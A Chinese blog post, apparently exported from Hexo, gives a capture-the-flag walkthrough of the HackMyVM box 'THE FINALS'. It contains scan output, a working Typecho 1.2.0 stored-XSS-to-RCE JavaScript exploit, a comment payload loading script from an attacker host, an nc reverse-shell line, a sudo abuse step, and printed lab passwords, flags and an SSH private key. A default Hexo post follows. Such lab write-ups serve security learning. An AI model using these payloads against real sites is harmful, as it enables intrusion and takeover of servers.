192.168.56.105 [1 port]<br>Completed ARP Ping Scan at 11:11, 0.07s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 11:11<br>Completed Parallel DNS resolution of 1 host. at 11:11, 0.03s elapsed<br>Initiating SYN Stealth Scan at 11:11<br>Scanning 192.168.56.105 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.105<br>Discovered open port 80/tcp on 192.168.56.105<br>Completed SYN Stealth Scan at 11:11, 0.10s elapsed (1000 total ports)<br>Initiating Service scan at 11:11<br>Scanning 2 services on 192.168.56.105<br>Completed Service scan at 11:11, 6.08s elapsed (2 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.105</span><br>NSE: Script scanning 192.168.56.105.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.27s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.01s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.105<br>Host is up (0.00076s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:<span class="hljs-built_in">cd</span>:4d:29 (ECDSA)<br>|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Unix))<br>|_http-title: THE FINALS<br>|_http-server-header: Apache/2.4.62 (Unix)<br>| http-methods: <br>|   Supported Methods: GET POST OPTIONS HEAD TRACE<br>|_  Potentially risky methods: TRACE<br>MAC Address: 08:00:27:BD:74:14 (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 22.031 days (since Tue May  6 10:27:15 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=265 (Good luck!)<br>IP ID Sequence Generation: All zeros<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.76 ms 192.168.56.105<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.36 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>dirsearch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Target: http://192.168.56.105/<br><br>[11:14:29] Starting:                                                                                                                    <br>[11:14:29] 301 -  311B  - /js  -&gt;  http://192.168.56.105/js/                <br>[11:14:30] 403 -  277B  - /.ht_wsr.txt                                      <br>[11:14:30] 403 -  277B  - /.htaccess.orig                                   <br>[11:14:30] 403 -  277B  - /.htaccess.bak1<br>[11:14:30] 403 -  277B  - /.htaccess.sample<br>[11:14:30] 403 -  277B  - /.htaccess.save<br>[11:14:30] 403 -  277B  - /.htaccess_extra                                  <br>[11:14:30] 403 -  277B  - /.htaccess_orig<br>[11:14:30] 403 -  277B  - /.htaccess_sc                                     <br>[11:14:30] 403 -  277B  - /.htaccessBAK<br>[11:14:30] 403 -  277B  - /.htaccessOLD<br>[11:14:30] 403 -  277B  - /.htaccessOLD2<br>[11:14:30] 403 -  277B  - /.htm                                             <br>[11:14:30] 403 -  277B  - /.html                                            <br>[11:14:30] 403 -  277B  - /.htpasswd_test                                   <br>[11:14:30] 403 -  277B  - /.htpasswds<br>[11:14:30] 403 -  277B  - /.httr-oauth<br>[11:14:37] 301 -  313B  - /blog  -&gt;  http://192.168.56.105/blog/            <br>[11:14:37] 200 -   17KB - /blog/                                            <br>[11:14:37] 200 -  820B  - /cgi-bin/printenv                                 <br>[11:14:37] 200 -    1KB - /cgi-bin/test-cgi                                 <br>[11:14:38] 301 -  312B  - /css  -&gt;  http://192.168.56.105/css/              <br>[11:14:40] 301 -  314B  - /fonts  -&gt;  http://192.168.56.105/fonts/          <br>[11:14:41] 200 -  607B  - /images/                                          <br>[11:14:41] 301 -  315B  - /images  -&gt;  http://192.168.56.105/images/<br>[11:14:42] 200 -  695B  - /js/                                              <br>[11:14:47] 301 -  320B  - /screenshots  -&gt;  http://192.168.56.105/screenshots/<br>[11:14:52] 403 -  277B  - /server-status/                                   <br>[11:14:52] 403 -  277B  - /server-status             <br></code></pre></td></tr></table></figure><p>开放80端口，扫到的可访问界面不少，浏览器挨个访问一下。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_PvS2gpMdrb.png"></p><p>这些图片点进去只是图片，没什么隐写之类的，另外两个点进去也都无法访问。</p><p>访问&#x2F;images，看到这里是存放图片的目录，没有其他东西，apache版本2.462，也没有洞可以打。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_kpAyGZ2Nni.png"></p><p>之后访问&#x2F;screenshots，终于有了一点起色，这里的截屏显示了一个博客框架的名称和版本号。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_eBNFTGQFsz.png"></p><p>访问&#x2F;blog，看出这个网站是用的上面提到的框架搭建的，很明显是让我们找这里的exp。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XSsBYn7cxa.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>搜索Typecho 1.2.0，得到exp:</p><p><a href="https://blog.csdn.net/m0_73299839/article/details/131939670">typecho存储型xss漏洞复现_存储型xss漏洞无交互-CSDN博客</a></p><p><a href="https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html">Typecho1.2 - 1.2.1-rc前台评论存储xss到rce 漏洞复现-分析-修复 - JunBlog</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 定义一个函数，在网页末尾插入一个iframe元素</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">insertIframe</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 获取当前页面路径</span><br>    <span class="hljs-keyword">var</span> urlWithoutDomain = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>;<br>    <span class="hljs-comment">// 判断页面是否为评论管理页面</span><br>    <span class="hljs-keyword">var</span> hasManageComments = urlWithoutDomain.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;manage-comments.php&quot;</span>);<br>    <span class="hljs-keyword">var</span> tSrc=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (hasManageComments)&#123;<br>        <span class="hljs-comment">// 如果是，则将路径修改为用于修改主题文件的页面地址</span><br>        tSrc=urlWithoutDomain.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;manage-comments.php&#x27;</span>,<span class="hljs-string">&#x27;theme-editor.php?theme=default&amp;file=404.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果不是，则直接使用主题文件修改页面地址</span><br>        tSrc=<span class="hljs-string">&#x27;/admin/theme-editor.php?theme=default&amp;file=404.php&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">// 定义iframe元素的属性，包括id、src、width、height和onload事件</span><br>    <span class="hljs-keyword">var</span> iframeAttributes = <span class="hljs-string">&quot;&lt;iframe id=&#x27;theme_id&#x27; src=&#x27;&quot;</span>+tSrc+<span class="hljs-string">&quot;&#x27; width=&#x27;0%&#x27; height=&#x27;0%&#x27; onload=&#x27;writeShell()&#x27;&gt;&lt;/iframe&gt;&quot;</span>;<br>    <span class="hljs-comment">// 获取网页原始内容</span><br>    <span class="hljs-keyword">var</span> originalContent = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-comment">// 在网页末尾添加iframe元素</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = (originalContent + iframeAttributes);<br>&#125;<br><br><span class="hljs-comment">// 定义一个全局变量isSaved，初始值为false</span><br><span class="hljs-keyword">var</span> isSaved = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// 定义一个函数，在iframe中写入一段PHP代码并保存</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeShell</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 如果isSaved为false</span><br>    <span class="hljs-keyword">if</span> (!isSaved) &#123; <br>        <span class="hljs-comment">// 获取iframe内的内容区域和“保存文件”按钮元素</span><br>        <span class="hljs-keyword">var</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;theme_id&#x27;</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;content&#x27;</span>);<br>        <span class="hljs-keyword">var</span> btns = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;theme_id&#x27;</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;button&#x27;</span>);    <br>        <span class="hljs-comment">// 获取模板文件原始内容</span><br>        <span class="hljs-keyword">var</span> oldData = content.<span class="hljs-property">value</span>;<br>        <span class="hljs-comment">// 在原始内容前加入一段phpinfo代码</span><br>        content.<span class="hljs-property">value</span> = (<span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;\n&#x27;</span>) + oldData;<br>        <span class="hljs-comment">// 点击“保存文件”按钮</span><br>        btns[<span class="hljs-number">1</span>].<span class="hljs-title function_">click</span>();<br>        <span class="hljs-comment">// 将isSaved设为true，表示已经完成写入操作</span><br>        isSaved = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件</span><br><span class="hljs-title function_">insertIframe</span>();<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://xxx.xxx.com/<span class="hljs-string">&quot;&gt;&lt;/a&gt;&lt;script/src=http://192.168.56.104:8000/shell.js&gt;&lt;/script&gt;&lt;a/href=&quot;</span>#<br></code></pre></td></tr></table></figure><p>点开文章进行评论，看到我们已经成功上传了文件。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_4t6uYI8d13.png"></p><p>查看exp中的地址&#x2F;usr&#x2F;blog&#x2F;theme&#x2F;default&#x2F;404.php，我们成功执行了phpinfo。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_h6eUy3YBx5.png"></p><p>那接下来就是爽爽的getshell了，传个post一句话冰蝎爽连……好吧爽连不了，不知道怎么回事，只能反弹shell了。</p><p>但是bash没反应。</p><p>把exp改一下改成read &#x2F;etc&#x2F;passwd，查看靶机用的shell名，用的是ash。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">content.<span class="hljs-property">value</span> = (<span class="hljs-string">&#x27;&lt;?php exec(&quot;nc 192.168.56.104 9000 -e /bin/ash&quot;); ?&gt;\n&#x27;</span>) + oldData;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_7pu2B4xxMb.png"></p><p>查看内部用户名</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_ClVQYvBwBt.png"></p><p>june用户目录是任意用户可访问的，cd到他的目录下拿到userflag</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XTmKlbv2Vq.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">user：flag&#123;4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298&#125;<br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><hr><p>再回到我们一开始拿到shell的目录下，find一下看看有没有能利用的提权文件，看了一下没有，但是目录下有一个config.php，内容是mysql的用户配置，于是想到利用mysql登录获取数据库里的信息。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_D4ODBatHvI.png"></p><p>给了user，passwd，database，db的权限也写好了，直接登录就好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u typecho_u -pQLTkbviW71CSRZtGWIQ<br></code></pre></td></tr></table></figure><p>这里用nc反弹的盲shell登录mysql老是延迟回显，只有在exit的情况下会把表显示出来，气不过回头重新用pty登了一次。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pty是一个python库，用于模拟终端登录过程，渗透测试中常用于升级盲shell，欺骗命令让它们以为自己在正确的终端中被执行<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XW7n771wDO.png"></p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_99yRkyGWtx.png"></p><p>ok我们把上面staff用户的哈希拿到了，hashcat启动。</p><p>莫得。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/WindowsTerminal_K6lRz3Ommm.png"></p><p>只能再回到shell里，刚刚find查询perm没有结果，那这一次看一看各自用户有没有什么文件可以利用。</p><p>通过查询用户scotty拥有的文件发现了一个日志文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user scotty 2&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/log/scotty-main.log<br></code></pre></td></tr></table></figure><p>查看日志，全是给192.168.11.255的广播信息。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_pwkX2gTEvV.png"></p><p>用nc本地监听1337端口，拿到一串不知道是什么的字符串，不过肯定是编码过了。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_mPH6XDjVlM.png"></p><p>赛博厨子magic一下，结果这是用户的私钥文件，结合刚刚的信息，可以ssh登scotty了。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/msedge_gaM3rV5NQC.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEwAAAJgDc/YUA3P2<br>FAAAAAtzc2gtZWQyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEw<br>AAAECv7kfeoXOQCi5CRIWdHiDT5upKyY3vQxAlKmxEQzRZLDXCfT3imE6qx9uj6jcIFiI3<br>fEDXrKYpJtfZRjfbH8ATAAAAEnJvb3RAdGhlZmluYWxzLmhtdgECAw==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_byqcEA4MVJ.png"></p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>看一下这个用户有什么权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> scotty on thefinals:<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>Runas and Command-specific defaults <span class="hljs-keyword">for</span> scotty:<br>    Defaults!/usr/sbin/visudo env_keep+=<span class="hljs-string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span><br><br>User scotty may run the following commands on thefinals:<br>    (ALL) NOPASSWD: /sbin/secret<br></code></pre></td></tr></table></figure><p>好吧，nopasswd只有一个，那就用吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~$ <span class="hljs-built_in">sudo</span> /sbin/secret<br>/sbin/secret: line 2: can<span class="hljs-string">&#x27;t create /dev/pts/99: Permission denied</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_5gL49eMJDw.png"></p><p>谔谔你让我创建到第99个shell吗，那很有手速了。</p><p>编写脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in $(seq 1 90); do python -c &#x27;import pty; pty.spawn(&quot;/bin/ash&quot;)&#x27; &amp; done<br></code></pre></td></tr></table></figure><p>之后再次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">sudo</span> /sbin/secret<br>root:p8RuoQGTtlKLAjuF1Tpy5wX<br></code></pre></td></tr></table></figure><p>终于拿到root密码了，ssh爽连……不了。</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_6NaGPVcFYR-1748483267238-18.png"></p><p>原来是mysql的密码。</p><p>使用root账户就可以访问secret数据库了，从user表中拿到真的root密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Database changed<br>MariaDB [typecho_db]&gt; use secret;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [secret]&gt; show tables;<br>+------------------+<br>| Tables_in_secret |<br>+------------------+<br>| user             |<br>+------------------+<br>1 row in set (0.000 sec)<br><br>MariaDB [secret]&gt; select * from user;<br>+----+----------+-------------------------+<br>| id | username | password                |<br>+----+----------+-------------------------+<br>|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |<br>+----+----------+-------------------------+<br>1 row in set (0.000 sec)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_3mFOyhfZWa.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~# <span class="hljs-built_in">cat</span> root.flag <br> _____      __   __      ______<br>/\  __\    /\ <span class="hljs-string">&quot;-.\ \    /\  ___\</span><br><span class="hljs-string">\ \ \___   \ \ \-.  \   \ \___  \</span><br><span class="hljs-string"> \ \____\   \ \_\\&quot;</span>\_\   \ \_____\<br>  \/____/    \/_/ \/_/    \/_____/<br><br>flag&#123;8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff&#125;<br><br>thefinals:~# <span class="hljs-built_in">cat</span> note.txt <br>ssh://root@thefinals.hmv:BvIpFDyB4kNbkyqJGwMzLcK<br>ssh://staff@thefinals.hmv:qDCsBTj30cQyityMh3Rnyys<br>ssh://june@thefinals.hmv:aYTmcORsUrmwaKa7C2DBLCh<br>ssh://scotty@thefinals.hmv:uuUoqAETern4v5tW2iMFs47<br><br>mariadb://root@localhost:p8RuoQGTtlKLAjuF1Tpy5wX<br><br>mariadb://typecho_u@typecho_db@localhost:QLTkbviW71CSRZtGWIQdB6s<br><br>typecho://staff@thefinals.hmv:n3nPbqEOhs6eTcchyqXTXWi<br>typecho://june@thefinals.hmv:DihPQiQqNO75vv8zNBzLwUm<br><br>flag&#123;4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298&#125;<br>canyoureachthefinals -&gt; sha256<br><br>flag&#123;8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff&#125;<br>youfinallyreachedthefinals -&gt; sha256<br><br>THE FINALS is a great FPS game. A lot of inspiration comes from games. Try it on http://reachthefinals.com/<br><br></code></pre></td></tr></table></figure><p>这个靶机打的还是挺爽的，XSS漏洞一直不是很懂，通过这一次复习了一下。</p><p>嗯这边我不知道那个xss利用是不是只能反弹shell，当时我想写一句话马用蚁剑或者冰蝎连但是老连不上，但是上面博客里的exp是有用post实现rce的复现的，可能这个靶机是做了些限制还是什么。</p><p>之后我看了LingMJ大佬的wp，发现他就是用的蚁剑练的post马，只是连接密码不一样，所以应该不是靶机的问题，可能我这边写入shell的方式有点问题吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/21/hello-world/"/>
    <url>/2025/02/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
